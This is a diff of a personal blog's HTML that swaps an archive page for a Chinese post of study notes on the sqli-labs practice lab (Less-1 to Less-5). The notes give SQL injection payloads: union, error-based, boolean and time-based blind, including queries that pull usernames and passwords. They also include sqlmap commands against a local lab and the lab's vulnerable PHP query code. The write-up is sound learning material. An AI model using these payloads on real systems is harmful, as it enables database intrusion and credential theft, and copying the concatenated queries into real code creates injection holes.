@@ -4,8 +4,8 @@
   <meta name="generator" content="Hexo 5.4.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://scylamb.github.io/archives/"/>
+  
+  <link rel="canonical" href="http://scylamb.github.io/ctf/做题笔记/sqli-labs/sqlilabs_page-1/"/>
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
@@ -20,20 +20,23 @@
   <meta content="Scylamb&#39;s Blog" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1629382751088" as="style">
+  <link rel="preload" href="/css/style.css?time=1629382751079" as="style">
   <!-- 页面元数据 -->
-  <title>Archive - Scylamb's Blog</title>
-  <meta name="keywords" content="aaa">
-  <meta name="description" content="Blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Scylamb&#39;s Blog">
-<meta property="og:url" content="http://scylamb.github.io/archives/index.html">
+  <title>sqlilabs_Page-1 - Scylamb's Blog</title>
+  <meta name="keywords" content="sqlilabs_Page-1,aaa">
+  <meta name="description" content="sqlilabs_Page-1Basic Injections（基本注入）  前言之前没坚持做完sqlilabs，这次来填坑 参考：国光    sqlilabs注入天书 注：大量复制原文，因为这两篇写的很好了，不重复造轮子了 0x00 less-1   请求方式 注入类型 拼接方式    GET 联合、报错、布尔盲注、延时盲注 id&#x3D;&#39;$id&#39;   123456789101112#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilabs_Page-1">
+<meta property="og:url" content="http://scylamb.github.io/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/index.html">
 <meta property="og:site_name" content="Scylamb&#39;s Blog">
-<meta property="og:description" content="Blog">
+<meta property="og:description" content="sqlilabs_Page-1Basic Injections（基本注入）  前言之前没坚持做完sqlilabs，这次来填坑 参考：国光    sqlilabs注入天书 注：大量复制原文，因为这两篇写的很好了，不重复造轮子了 0x00 less-1   请求方式 注入类型 拼接方式    GET 联合、报错、布尔盲注、延时盲注 id&#x3D;&#39;$id&#39;   123456789101112#">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2021-04-03T01:25:00.000Z">
+<meta property="article:modified_time" content="2021-04-14T01:38:48.742Z">
 <meta property="article:author" content="ScyLamb">
-<meta property="article:tag" content="aaa">
+<meta property="article:tag" content="sqlilabs">
+<meta property="article:tag" content="做题笔记">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png">
   <!-- feed -->
@@ -1817,8 +1820,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1629382751088" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1629382751088"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1629382751079" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1629382751079"></noscript>
   
 <script>
 if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
@@ -2132,7 +2135,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="half" class='cover-wrapper  dock' style="display: ;">
+      <div id="half" class='cover-wrapper post dock' style="display: ;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture"></div>
 
@@ -2207,287 +2210,726 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 <div id="l_main" class=''>
-	
-	  <article id="arc" class="post article white-box reveal shadow">
-			
-			
-				
-				
-					
-						
-						<h2>2021</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/web%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/web%E6%96%B0%E6%89%8B%E5%8C%BA/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/Scattered%20topics/CG_sql%E6%B3%A8%E5%85%A52/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/CTFhub/web/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019EasySQL/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/%5BHCTF%202018%5Dwarmup/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/V&amp;N2021/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/SUCTF_2019EasySQL/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BuuCTF/ACTF2020_%E6%96%B0%E7%94%9F%E8%B5%9B/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BugKu/dis-understand/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/BugKu/BugKu_web1~35/">
-									<time>08-19</time>
-									
-										2021-08-19
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/uncategorized/hello-world/">
-									<time>08-19</time>
-									
-										Hello World
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-4/">
-									<time>04-03</time>
-									
-										sqlilabs_Page-4
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/">
-									<time>04-03</time>
-									
-										sqlilabs_Page-1
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-3/">
-									<time>04-02</time>
-									
-										sqlilabs_Page-3
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-2/">
-									<time>04-01</time>
-									
-										sqlilabs_Page-2
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-	  </article>
-	
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        sqlilabs_Page-1
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/ctf/">ctf</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 3, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="sqlilabs_Page-1" data-path="/ctf/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/sqli-labs/sqlilabs_Page-1/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
+    
+  </div>
+
+
+  <div id="page-plugins-helper"></div>
+  <h1 id="sqlilabs-Page-1"><a href="#sqlilabs-Page-1" class="headerlink" title="sqlilabs_Page-1"></a>sqlilabs_Page-1</h1><p>Basic Injections（基本注入） </p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><div class="story post-story"><p>之前没坚持做完sqlilabs，这次来填坑</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">国光</a>    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">sqlilabs注入天书</a></p>
+<p><strong>注：大量复制原文，因为这两篇写的很好了，不重复造轮子了</strong></p>
+</div><h2 id="0x00-less-1"><a href="#0x00-less-1" class="headerlink" title="0x00 less-1"></a>0x00 less-1</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>id=&#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 单引号拼接</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"><span class="comment">// 释放结果集</span></span><br><span class="line">mysqli_free_result(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持联合、报错、布尔盲注、时间盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
+<p>mysqli_fetch_array()：从结果集中取得一行作为数字数组或关联数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqli_fetch_array(result,resulttype);</span><br><span class="line">resulttype规定应该产生哪种类型的数组:MYSQLI_ASSOC关联数组/MYSQLI_NUM数字数组/MYSQLI_BOTH两者</span><br></pre></td></tr></table></figure>
+
+<p>联合查询注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加单引号，报错，1&#x27; and 1 = 1成功1&#x27; and 1 = 2失败，推测后端中是&#x27;$id&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br><span class="line"><span class="string">-1&#x27;</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables where table_schema = database()--+</span><br><span class="line">-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns where table_schema = database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span></span><br><span class="line"><span class="string">SEPARATOR 将结果按某种字符分隔</span></span><br><span class="line"><span class="string">0x3c62723e==&lt;br&gt;</span></span><br><span class="line"><span class="string">通常联合order by使用GROUP_CONCAT(SCORE order by USERID separator &#x27;</span>;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>报错注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1))%23</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">主要语句：</span></span><br><span class="line"><span class="string">CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e)</span></span><br></pre></td></tr></table></figure>
+<p>学了一个新函数<a target="_blank" rel="noopener" href="https://www.yiibai.com/mysql/cast.html">cast()</a>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAST(expression AS TYPE);</span><br></pre></td></tr></table></figure>
+
+<p><code>CAST()</code>函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一：<code>BINARY</code>，<code>CHAR</code>，<code>DATE</code>，<code>DATETIME</code>，<code>TIME</code>，<code>DECIMAL</code>，<code>SIGNED</code>，<code>UNSIGNED</code>。</p>
+<p><code>CAST()</code>函数通常用于返回具有指定类型的值，以便在<a target="_blank" rel="noopener" href="http://www.yiibai.com/mysql/where.html">WHERE</a>，<a target="_blank" rel="noopener" href="http://www.yiibai.com/mysql/inner-join.html">JOIN</a>和<a target="_blank" rel="noopener" href="http://www.yiibai.com/mysql/having.html">HAVING</a>子句中进行比较。</p>
+<p><strong>布尔盲注：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and (select ascii(substr(database(),1,1)))&gt;100#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line"><span class="number">3</span><span class="string">&#x27; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68%23</span></span><br><span class="line"><span class="string">2&#x27;</span> union select database() regexp <span class="string">&#x27;^[a-z]&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>IFNULL（）它接受两个参数，如果不是<code>NULL</code>，则返回第一个参数。 否则，<code>IFNULL</code>函数返回第二个参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(expression_1,expression_2); </span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>时间盲注：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and sleep(if(substr(database(),1,1)=&#x27;</span>p<span class="string">&#x27;,5,0))#</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">114</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v <span class="number">3</span></span><br><span class="line">报错注入    </span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v <span class="number">3</span></span><br><span class="line">布尔注入    </span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v <span class="number">3</span></span><br><span class="line">时间注入   </span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:8888/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>原来大佬喜欢加上这些参数去使用，记录学习一下：<code>--random-agent</code>    </p>
+<p><code>-v 3</code>：同时显示基本信息、警告信息、debug信息、payload</p>
+<p><code>--flush-session</code>：如果不想用之前缓存这个目标的session文件，可以使用该参数。 会清空之前的session，重新测试该目标。</p>
+<p><code>--technique=</code>：可以指定sqlmap使用的探测技术，默认值为<code>BEUSTQ</code>。【英文首字母】</p>
+<blockquote>
+<p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）<br>Q：内联查询注入</p>
+</blockquote>
+<p>疑问及解答：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27; 2&#x27; and  1 = 1#  &#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27; 2 and 1 = 1 &#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27; 2 and 1 = 2 &#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27; 2&#x27; and &#x27;1&#x27;=&#x27;1 &#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">这些都能成功返回id=<span class="number">2</span>的结果的具体原因是？</span><br><span class="line">测试后的回答：</span><br><span class="line">    第一句是因为当且仅当id=<span class="number">2</span>时这个条件才返回真，故不会返回其他值</span><br><span class="line">    后三句是因为id的类型为数值型,例如<span class="keyword">int</span>；而查询的时候传入的是字符串，而MYSQL会自动进行弱类型转换，如同PHP的弱类型，varchar 的’<span class="number">2</span>asd <span class="number">1</span>=<span class="number">1</span>’会被转成<span class="keyword">int</span>的 <span class="number">2</span>。</span><br><span class="line"></span><br><span class="line">在测试中【去除limit】</span><br><span class="line">发现</span><br><span class="line">   ①id = -<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> 返回所有的值</span><br><span class="line">   ②id = <span class="number">1</span>【或者其他任意数字】 <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> 返回所有的值</span><br><span class="line">    </span><br><span class="line">   ③id = <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">1</span> 返回id等于<span class="number">2</span>的值</span><br><span class="line">   ④<span class="number">1</span> = <span class="number">1</span> <span class="keyword">and</span> id = <span class="number">2</span> 返回id等于<span class="number">2</span>的值</span><br><span class="line">   ⑤id = <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> = <span class="number">0</span> <span class="keyword">Empty</span> set</span><br><span class="line">   </span><br><span class="line">   ①与② 返回<span class="literal">TRUE</span>（永真式），所以查询所有ID吗？</span><br><span class="line">   测试select * <span class="keyword">from</span> users where <span class="literal">True</span>;确实返回所有的值</span><br><span class="line">   </span><br><span class="line">   select * <span class="keyword">from</span> users where id = <span class="number">2</span> <span class="keyword">or</span> id = <span class="number">1</span>;</span><br><span class="line">   返回<span class="number">2</span>列</span><br><span class="line">   select * <span class="keyword">from</span> users where id = <span class="number">2</span> <span class="keyword">and</span> id = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">Empty</span> set</span><br><span class="line">   为什么，因为不能同时满足这两个条件</span><br><span class="line">       </span><br><span class="line"> </span><br><span class="line">id= <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema = database()),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br><span class="line">能返回id=<span class="number">1</span>的结果的具体原因？懒，待解决</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Less1-less4 都可以利用上述方法注入，区别于闭合方法的不同</strong></p>
+</div><h2 id="0x01-less-2"><a href="#0x01-less-2" class="headerlink" title="0x01 less-2"></a>0x01 less-2</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>id=$id</code></td>
+</tr>
+</tbody></table>
+<p>输入<code>?id=1&#39;</code>，报错<code> right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>故后端语句为<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+<p>数字型SQL注入</p>
+</div><h2 id="0x02-less-3"><a href="#0x02-less-3" class="headerlink" title="0x02 less-3"></a>0x02 less-3</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>id=(&#39;$id&#39;)</code></td>
+</tr>
+</tbody></table>
+<p>输入<code>?id=1&#39;</code>，报错<code> right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1 at line 1</code></p>
+<p>故后端语句为<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+</div><h2 id="0x03-less-4"><a href="#0x03-less-4" class="headerlink" title="0x03 less-4"></a>0x03 less-4</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">联合、报错、布尔盲注、延时盲注</td>
+<td align="left"><code>id=(&quot;$id&quot;)</code></td>
+</tr>
+</tbody></table>
+<p>这里有点不同，输入一般测试<code>?id=1&#39;</code>会正常返回ID等于1的值，但其实是因为MySQL的弱类型转化导致转成了int类型的<code>1</code></p>
+<p>应该输入测试<code>?id=2&quot;</code>，报错<code>use near &#39;&quot;2&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+</div><h2 id="0x04-less-5"><a href="#0x04-less-5" class="headerlink" title="0x04 less-5"></a>0x04 less-5</h2><div class="story post-story"><table>
+<thead>
+<tr>
+<th align="left">请求方式</th>
+<th align="left">注入类型</th>
+<th align="left">拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">GET</td>
+<td align="left">报错、布尔盲注、时间盲注</td>
+<td align="left"><code>id=&#39;$id&#39;</code></td>
+</tr>
+</tbody></table>
+<p>源码分析：</p>
